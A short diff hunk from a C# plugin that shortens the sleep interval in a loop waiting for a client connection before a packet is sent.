@@ -61,7 +61,7 @@ namespace Plugin
             ClientHandler clientHandler = new ClientHandler(host, key);
             clientHandler.ConnectStart();
             while (!clientHandler.Connected)
-                Thread.Sleep(1000);
+                Thread.Sleep(125);
 
             clientHandler.SendPacket(packet);
         }
